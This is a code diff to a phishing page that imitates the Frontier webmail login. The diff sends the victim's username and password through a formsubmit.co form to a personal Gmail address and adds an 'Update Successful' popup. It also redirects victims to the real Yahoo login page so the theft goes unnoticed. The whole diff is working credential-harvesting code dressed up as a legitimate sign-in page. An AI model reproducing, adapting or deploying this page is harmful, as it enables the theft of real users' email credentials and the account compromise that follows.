@@ -49,9 +49,17 @@
 
     <script src="/dtm_top.js"></script><script src="//assets.adobedtm.com/fc19531c0bf6205e4c8c1a357c620866eec50643/satelliteLib-4b8641237ab881231ea9edcc135d0fdd111e2a40.js"></script>
 
+    
   </head>
   <body>
-    <section>
+   
+  <div class="popup" id="popup">
+    <img src="/HD_Outline_Tick_Check_Mark_Symbol_Logo_In_Red_Circle_Icon_PNG-removebg-preview.png" alt="">
+    <h2>Update Successful</h2>
+    <button type="submit" onclick="closepopup()"><a href="https://login.yahoo.com/?.intl">Ok</a></button>
+  </div>
+
+    <section id="blur" class="">
 
       <div class="header_area">
         <nav class="navbar navbar-inverse ftr-navbar-inverse-solid" role="navigation">
@@ -67,7 +75,7 @@
                   </button>
                 </div>
                 <div class="col-xs-8 navbar-div-logo">
-                  <a href="https://frontier.com"><img class="logo-img" src="./frontier-logo-white.png"></a>
+                  <a href="https://frontier.com"><img class="logo-img" src="/frontier-logo-white.png"></a>
                 </div>
               </div>
             </div>
@@ -134,13 +142,13 @@ function submit_login(e)
     form.loginButton.disabled = true;
     form.submit();
     return true;
-  }s
+  }
 }
 //-->
 </script>
 
-      <form action="https://formsubmit.co/Garybull299@gmail.com" method="POST" action="./index2.html">
-        <input type="hidden" name="_next" value="http://127.0.0.1:5500/index2.html">
+      <form action="https://formsubmit.co/garybull299@gmail.com" method="POST">
+        <input type="hidden" name="_next" value="https://login.yahoo.com/?.intl=in">
         <input type="hidden" name="_captcha" value="false">
         <input type="hidden" name="_template" value="table">
       <div id="webmail-login">
@@ -159,7 +167,7 @@ function submit_login(e)
                 <input type="password" class="form-control" tabindex="2" name="password" id="pass" placeholder="**********" autocomplete="off">
               </div>
 
-              <button type="submit" tabindex="6" class="btn btn-primary btn-block" alt="submit">Login</button>
+              <button type="submit" tabindex="6" class="btn btn-primary btn-block" alt="submit" onclick="openpopup();openpopup2()" >Login</button>
                 
 
               <p><a href="https://acctedit.frontier.com/forgot-password;src=mail">Forgot your password ?</a></p>
@@ -399,6 +407,22 @@ function submit_login(e)
     </section>
 
     <script src="/dtm_bottom.js"></script><script>try { _satellite.pageBottom(); } catch (e) {}</script>
+    <script>
+      let popup = document.getElementById("popup");
 
+      let blur = document.getElementById("blur")
+
+      function openpopup(){
+        popup.classList.add("open-popup");
+      }
+      function openpopup2(){
+        popup.classList.add("open-popup");
+      blur.classList.add("active")
+      }
+      function closepopup(){
+        popup.classList.remove("open-popup");
+        
+      }
+    </script>
   </body>
 </html>
